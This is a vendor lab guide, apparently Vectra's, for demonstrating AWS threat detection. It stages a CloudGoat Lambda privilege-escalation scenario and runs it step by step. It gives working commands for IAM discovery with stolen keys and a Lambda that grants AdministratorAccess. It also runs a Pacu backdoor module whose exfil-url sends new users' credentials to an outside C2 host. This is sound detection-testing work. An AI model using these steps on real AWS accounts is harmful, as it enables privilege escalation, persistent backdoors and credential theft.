.. toctree::
   :maxdepth: 2
   :hidden:

-----------------
Detect for AWS
-----------------

What is Detect for AWS?
=======================

Detect for AWS offers advanced Threat Detection & Response coverage for the AWS control plane. We leverage advanced AI & ML techniques to monitor all activity in an organization’s global AWS footprint for malicious behaviors. Detect for AWS leverages CloudTrail log and contextual IAM information to find malicious activity, and then attribute it to the malicious actor itself using Vectra’s Kingpin technology.  Detect for AWS is delivered as a SaaS (Software as a Service) solution in Vectra’s cloud.

Lab Objective
=============
The Detect for AWS Detection lab has been created to empower Vectra field staff and customers with the option to show concrete Detect for AWS Detections in live environments when the situation calls for it. To accomplish this objective, this lab contains a number of scripts, supporting resources, and associated attacker narratives that provide context for both the value and means of test execution.

Scenario 
========
An attacker finds AWS user credentials in a GitHub repository.  These accidentals leaks can happen through misconfiguration of a. gitignore file. 

The attack consists of two parts. First attacker performs privilege escalation using Lambda. After the privilege escalation attacker create persistence using a lambda create creates backdoor IAM user credentials for all new users

Lambda Privilege Escalation (Part 1)
====================================
- Stolen IAM credentials have limited access, but can assume IAM roles and query IAM details
- After IAM discovery campaign, attacker discovers two roles
   - IAM role that has full Lambda access 
   - IAM service role that has admin permissions that can only be assumed by Lambda service
- Attacker assumes the Lambda admin role
- Attacker creates a privilege escalation Lambda
- Attacker passes a high privilege Lambda service role 
- Attacker has achieved privilege escalation 

Serverless Persistence (Part 2)
================================
- Attacker pivots to pacu and uses escalated privileges to list Lambda functions
- Attacker creates a new Lambda function
   - Function has CloudWatch events rule that will trigger when new IAM users is created


Lab Notes
=========
-  There are other ways to install the tools and will depend on distro.
-  Setting up the AWS profile may very based on an organizations
   requirements. For instance SSO would vary between org.

Requirements
============
-  Linux or MacOS. Windows is not officially supported.

   -  If you are using Windows we recommand install
      `WSL2 <https://docs.microsoft.com/en-us/windows/wsl/install>`__
   -  If you are using a Linux virtual machine AWS EC2 is not supported
   -  In this guide a new Ubuntu VM was created in VM Fusion. This guide
      goes through setting up the Ubuntu VM.

-  Python3.6+ is required.
-  Terraform >= 0.14 installed and in your $PATH.
-  The AWS CLI installed and in your $PATH, and an AWS account with
   sufficient privileges to create and destroy resources.

   -  AWS `Named profile
      configured <https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-profiles.html>`__


Build attacker machine
======================

Install common packages
+++++++++++++++++++++++

.. code:: console

    sudo apt-get update && sudo apt install -y ssh vim net-tools curl git python3-pip 

Install awscli
++++++++++++++

-  Download the package

.. code:: console

    curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"

-  Unzip the installer

.. code:: console

    unzip awscliv2.zip

-  Run the install program

.. code:: console

    sudo ./aws/install

Install terraform
+++++++++++++++++

-  Terraform Prerequisites

.. code:: console

    sudo apt-get update && sudo apt-get install -y gnupg software-properties-common

-  Add the HashiCorp GPG key

.. code:: console

    curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -

-  Add the official HashiCorp Linux repository

.. code:: console

    sudo apt-add-repository "deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main"

-  Update to add the repository, and install the Terraform CLI
  
.. code:: console

    sudo apt-get update && sudo apt-get install terraform

Install Cloudgoat
+++++++++++++++++
-  Use git to clone the Cloudgoat repo to home directory and change to
   the new directory

.. code:: console     
   
    git clone https://github.com/RhinoSecurityLabs/cloudgoat.git ~/cloudgoat && cd ~/cloudgoat
   
-  Install the Cloudgoat dependencies

.. code:: console

    pip3 install -r ./core/python/requirements.txt && chmod u+x cloudgoat.py

Install Pacu
++++++++++++

-  Use git to clone the Pacu repo to home directory and change to the
   new directory

.. code:: console

    git clone https://github.com/RhinoSecurityLabs/pacu.git ~/pacu && cd ~/pacu

-  Install the Pacu dependencies
 
.. code:: console      
   
    pip3 install -r requirements.txt

Setup AWS Profile
+++++++++++++++++

-  Setup AWS profile for Cloudgoat. This account will need admin access
   in AWS. This will create or add a new profile in ``~/.aws/config``
   and ``~/.aws/credentials``

-  You will be prompted for
   ``Access Key ID, AWS Secret Access Key, Default region name, Default output format``

.. code:: console

    aws configure --profile cloudgoat

-  Make the new aws profile your default

.. code:: console

    export AWS_PROFILE=cloudgoat

-  Verify credentials are working

.. code:: console

    aws sts get-caller-identity

.. figure:: ./images/awsprofile.png
    :alt: awsprofile

Setup Cloudgoat
+++++++++++++++

- Run Cloudgoat config profile from home directory and set default
  profile. You will be prompted to enter an AWS profile from the
  previous step which we called ``cloudgoat``. This is how Cloudgoat
  will access AWS. 
      
.. code:: console
      
    ~/cloudgoat/cloudgoat.py config profile

- Run Cloudgoat config whitlelist
   
.. code:: console

    ~/cloudgoat/cloudgoat.py config whitelist --auto

Create vulnerable infrastructure
++++++++++++++++++++++++++++++++

- Now that the tools are setup we will use Cloudgoat to setup vulnerable
  infrastructure in AWS. This will create our scenario

-  Run the attack scenario

.. code:: console
   
    ~/cloudgoat/cloudgoat.py create lambda_privesc

.. figure:: ./images/cloudgoatout.png
   :alt: cgsetup

- Collect the 3 outputs and copy them to a text file:
   - cloudgoat_output_aws_account_id
   - cloudgoat_output_chris_access_key_id
   - cloudgoat_output_chris_secret_key

Start attack
============

At this point we have created vulnerable infrastructure in AWS using
Cloudgoat. Starting as an anonymous outsider with no access or
privileges.

- Create a new aws profile with scenarios stolen credentials

.. code:: console

    aws configure --profile chris

-  Set the ``AWS Access Key ID`` and ``AWS Secret Access Key`` using the
   stolen chris credentials (Chris was created by Cloudgoat)

-  Set the “Default region” to ``us-east-1`` and the “Default output” format to
   ``json``

- Do discovery to find the username associated with the access key

.. code:: console

    aws sts get-caller-identity --profile chris

- With the username list all user policies and copy the policy ARN to your text file

.. code:: console

    aws iam list-attached-user-policies --user-name <associated user name> --profile chris

- Get current version of the policy using the ARN from the previous step

.. code:: console

    aws iam get-policy-version --policy-arn <ARN> --version-id v1 --profile chris 

The policy allows the user to assume and list roles

- List the roles and copy the ``Role Name`` and ``ARN`` of the role name to your text file

.. code:: console

    aws iam list-roles --profile chris | grep cg-debug-role-lambda 
    
.. code:: console

    aws iam list-roles --profile chris | grep cg-lambdaManager-role-lambda 

- Use the role name output to list the attached policies and copy the ``Policy Name`` and ``ARN`` output to your text file

.. code:: console
   
    aws iam list-attached-role-policies --role-name <debug role name> --profile chris
    
.. code:: console

    aws iam list-attached-role-policies --role-name <lambda manager role name> --profile chris

- From that output you can see
   - ``cg-debug-role-lambda_privesc`` can be assumed by a Lambda
   - ``cg-lambdaManager-role-lambda_privesc`` can be assumed by your user

- Let’s get the polices attached to the role we can assume

.. code:: console

    aws iam get-policy-version --policy-arn <lambdaManager policy ARN> --version-id v1 --profile chris

- From the output we can see the role has Lambda admin permissions

Create Lambda Function 
======================

To assume the role you will need the role ARN for cg-lambdaManager-role-lambda.  If you need it again you can run ``aws iam list-roles --profile chris | grep cg-lambdaManager-role-lambda``

- Assume the role

.. code:: console

    aws sts assume-role --role-arn <Lambda Manager Role ARN> --role-session-name lambdaManager --profile chris

- When you assume the role new security credentials displayed.  You will need these to setup a new profile so copy them to your text tile 

- Create a new AWS profile

.. code:: console

     aws configure --profile lambdaManager

-  Set the ``AWS Access Key ID`` and ``AWS Secret Access Key`` using the
   assumed role credentials 

-  Set the “Default region” to ``us-east-1`` and the “Default output” format to
   ``json``

-  Manually add the ``aws_session_token`` to the aws credentials file
   (use i for insert mode then esc :wq to save and close)

.. code:: console

     vi  ~/.aws/credentials

.. figure:: ./images/sestoken.png
   :alt: sestoken

- Create new file

.. code:: console 

     touch lambda_function.py && vi lambda_function.py

- Add contents to new file anc update with your discovered username ``aws sts get-caller-identity --profile chris``

.. code:: python

    import boto3
    def lambda_handler(event, context):
            client = boto3.client('iam')
            response = client.attach_user_policy(UserName = '<username>', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
            return response

- Zip the file 

.. code:: console

    zip -q lambda_function.py.zip lambda_function.py


- Deploy and assign the Lambda function with the Lambda admin role.  This is the ARN from ``cg-debug-role-lambda_privesc`` discovered in a previous step by running ``aws iam list-roles --profile chris | grep cg-debug-role-lambda``

.. code:: console

    aws lambda create-function --function-name admin_function-<initials> --runtime python3.6 --role <Role ARN> --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdaManager

- Invoke the new function 

.. code:: console

   aws lambda invoke --function-name admin_function-<initials> out.txt --profile lambdaManager

- Test privilege escalation user policy was applied.

.. code:: console

    aws iam list-attached-user-policies --user-name <username> --profile chris


Serverless Persistence
======================
For this part of the attack we will use Pacu


-  Start pacu from the shell session by running ``~/pacu/cli.py``
-  Create new session in pacu named ``chris``
-  Add the keys from your AWS profile using ``import_keys chris``
-  List the Lambda functions with ``run lambda__enum``

Create persistence with Lambda that creates a backdoor IAM user credentials.  This will require 2 inputs which you will need prior to proceeding
   - Role ARN from previous attack ``aws iam list-roles --profile chris | grep cg-debug-role-lambda``
   - exfil-url ``https://commander-api.vectratme.com/adduser``

Once you have the above values run the below in pacu.  You will be prompted for the ARN.

.. code:: console

    run lambda__backdoor_new_users --exfil-url https://commander-api.vectratme.com/adduser

Persistence has been set. Lets create a new user to test it (you don't need to leave pacu)

.. code:: console
    
    aws iam create-user --user-name <initials> --profile chris

Now let’s visit our C2 site https://commander.vectratme.com/ to verify.  You will need a logon provided by Vectra.

image

Lab Cleanup
===========

Exit pacu
Delete Lambda functions
There will be 2
- aws lambda delete-function --function-name admin_function-<initials> 
- Function created by Pacu

Detach the policies from the user "chris".  This was added in a pervious step.

aws iam  detach-user-policy --user-name <username> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

Run cloudgoat destroy lambda_privesc
